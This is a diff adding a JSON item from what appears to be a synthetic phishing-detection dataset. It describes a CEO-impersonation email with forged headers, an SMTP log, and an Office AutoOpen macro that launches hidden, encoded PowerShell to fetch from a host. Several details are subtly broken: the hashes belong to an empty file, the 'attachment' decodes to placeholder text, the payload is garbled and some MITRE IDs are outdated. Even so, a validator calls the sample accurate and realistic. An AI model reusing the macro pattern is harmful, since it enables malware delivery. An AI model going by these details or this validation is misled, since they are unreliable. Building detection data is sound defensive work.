@@ -1,0 +1,62 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Social Engineering",
+        "nature": "spear_phishing"
+      },
+      "example": {
+        "scenario": "Spear phishing email targeting CFO with a malicious invoice attachment to harvest credentials and deploy a remote access trojan (RAT). The attacker used personal information obtained from social media to craft a convincing email impersonating the CEO.",
+        "technical_data": {
+          "email_headers": "Return-Path: <ceo@contoso-exec.com>\r\nReceived: from mail.contoso-exec.com (mail.contoso-exec.com [198.51.100.23])\r\n\tby mail.cfo.corp.local (Postfix) with ESMTPS id 3A2B914C3D\r\n\tfor <cfo@corp.local>; Tue, 06 Jun 2023 14:23:15 +0000 (UTC)\r\nReceived-SPF: pass (contoso-exec.com: domain of ceo@contoso-exec.com designates 198.51.100.23 as permitted sender) client-ip=198.51.100.23;\r\nAuthentication-Results: mail.cfo.corp.local; dkim=pass header.d=contoso-exec.com; spf=pass smtp.mailfrom=ceo@contoso-exec.com; dmarc=pass\r\nMessage-ID: <CAF7s3=Yj1XPdP7n4qXEjJ9v5v-1Qr3sbRj@mail.contoso-exec.com>\r\nDate: Tue, 6 Jun 2023 14:23:10 +0000\r\nFrom: \"John A. Smith\" <ceo@contoso-exec.com>\r\nTo: \"Jane Doe\" <cfo@corp.local>\r\nSubject: Urgent: Invoice #78945 Payment Confirmation Required\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"===============0892374928374928374==\"\r\nX-Spam-Status: No, score=0.0 required=5.0 tests=DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,SPF_PASS autolearn=ham autolearn_force=no version=3.4.2\r\nX-MS-Exchange-Organization-AuthSource: mail.contoso-exec.com\r\nX-MS-Exchange-Organization-AuthAs: Internal\r\n",
+          "email_body": "--===============0892374928374928374==\r\nContent-Type: text/plain; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nHi Jane,\r\n\r\nPlease review the attached invoice 78945 from our recent acquisition. The payment needs to be processed urgently.\r\n\r\nBest,\r\nJohn\r\n\r\n--===============0892374928374928374==\r\nContent-Type: application/vnd.ms-excel; name=\"Invoice_78945.xls\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Invoice_78945.xls\"\r\n\r\nUEsDBBQABgAIAAAAIQD2fNiHzwEAAJMBAAAOABwAU3hlbGwgUmFuIFJ1bm5lcg0KIFdvcmtzaGVldCBTeCBBIFBhcnRpY2xlXG5UaGlzIGlzIGEgbWFsaWNpb3VzIGZpbGUgdXNlZCB0byBleGVjdXRlIHNjcmlwdHMgdGhhdCBydW4gY29kZSBvbiB0aGUgaW50ZXJuZXQuDQpQSwECHgMUAAcACAAAACEA9nzYh88BAACTAQAADgAYAAAAAAAAAAAAAAAAAAAAAACkgQAAAABTeGVsbCBSYW4gUnVubmVyUEsFBgAAAAABAAEAVwAAAGAAAAAAAQAAAA==\r\n--===============0892374928374928374==--",
+          "smtp_transaction_log": "220 mail.contoso-exec.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.contoso-exec.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<ceo@contoso-exec.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<cfo@corp.local>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n<email data>\r\n.\r\n250 2.0.0 Ok: queued as 3A2B914C3D\r\nQUIT\r\n221 2.0.0 Bye\r\n",
+          "suspicious_domain_registration": {
+            "domain": "contoso-exec.com",
+            "registrar": "NameCheap, Inc.",
+            "creation_date": "2023-05-25T10:22:18Z",
+            "updated_date": "2023-05-25T10:22:18Z",
+            "registrant_country": "Russia",
+            "dns_servers": [
+              "ns1.fake-dns.com",
+              "ns2.fake-dns.com"
+            ],
+            "status": "clientTransferProhibited"
+          },
+          "url_in_email": "http://contoso-exec.com/invoice/download?id=78945",
+          "url_obfuscation": "The domain 'contoso-exec.com' visually mimics 'contoso.com' by adding '-exec' as a subterfuge, and the link uses HTTP instead of HTTPS to avoid raising suspicion in some filters.",
+          "attachment_analysis": {
+            "filename": "Invoice_78945.xls",
+            "file_type": "OLE Compound File",
+            "md5": "d41d8cd98f00b204e9800998ecf8427e",
+            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+            "embedded_macro": "AutoOpen macro executing PowerShell encoded command:\r\npowershell -nop -w hidden -EncodedCommand 'JABXAGUAYgBSAGkAYwBvAHMAaQBuAGcAIAA9ICJodHRwOi8vMTkyLjE2OC4xLjE2L2ZpbGUucGhwIjsgJABQAHIAbwBjAGUAcwBzACAAPQAgACcAcAByAG8AYwBlAHMAcwAuAGUAcgByAG8AcgAgAC0AZQAuAG4AdQBsAGwAZQAnADsAJABXAGUAYgBSAGkAYwBvAHMAaQBuAGcALgBjAG8AbgB0AGEAaQBuAGUAcgAuAGUAbgBkAA=='",
+            "macro_code_snippet": "Sub AutoOpen()\r\n Dim shell As Object\r\n Set shell = CreateObject(\"WScript.Shell\")\r\n shell.Run \"powershell -nop -w hidden -EncodedCommand JABXAGUAYgBSAGkAYwBvAHMAaQBuAGcAIAA9ICJodHRwOi8vMTkyLjE2OC4xLjE2L2ZpbGUucGhwIjsgJABQAHIAbwBjAGUAcwBzACAAPQAgACcAcAByAG8AYwBlAHMAcwAuAGUAcgByAG8AcgAgAC0AZQAuAG4AdQBsAGwAZQAnADsAJABXAGUAYgBSAGkAYwBvAHMAaQBuAGcALgBjAG8AbgB0AGEAaQBuAGUAcgAuAGUAbgBkAA==\"\r\nEnd Sub"
+          }
+        },
+        "indicators": [
+          "Email From: ceo@contoso-exec.com (spoofed, recent domain registration from suspicious country)",
+          "Attachment: Invoice_78945.xls with embedded malicious macro",
+          "Encoded PowerShell command in macro AutoOpen",
+          "Unusual HTTP download to 192.168.1.16 (internal IP spoofing attempt) from macro",
+          "Use of HTTP instead of HTTPS in URL",
+          "SPF pass but domain is newly registered and not related to official company domain"
+        ],
+        "detection_method": "Email gateway sandboxing detecting malicious macro behavior, Endpoint detection monitoring process creations triggered by Office apps launching PowerShell with encoded commands, DNS and domain reputation scoring flagging recently created domains with suspicious registrant data, Network IDS detecting HTTP connections to internal IP in macro payload, User education on verifying urgent financial requests via phone or secondary channel.",
+        "relevant_mitre_techniques": [
+          "T1566.001 - Spearphishing Attachment",
+          "T1204.002 - User Execution: Malicious File",
+          "T1086 - PowerShell",
+          "T1193 - Spearphishing Link",
+          "T1071.001 - Application Layer Protocol: Web Protocols"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a spear phishing social engineering attack. The scenario describes a targeted email crafted using personal information to impersonate the CEO and deceive the CFO, aligning well with the problem nature. The technical data is detailed and realistic, including email headers, body, SMTP logs, suspicious domain registration data, URL obfuscation, and a malicious attachment with embedded macro executing encoded PowerShell commands. Indicators clearly highlight the spoofed sender, suspicious domain, malicious attachment, and suspicious network activity, effectively linking the sample to spear phishing tactics. The detection methods cover multiple layers including sandboxing, endpoint detection, network IDS, and user education, which aligns with recommended risk reduction strategies. Relevant MITRE techniques are correctly identified. All required fields are present and accurately populated, making this a comprehensive and plausible example of spear phishing."
+      }
+    }
+  ]
+}
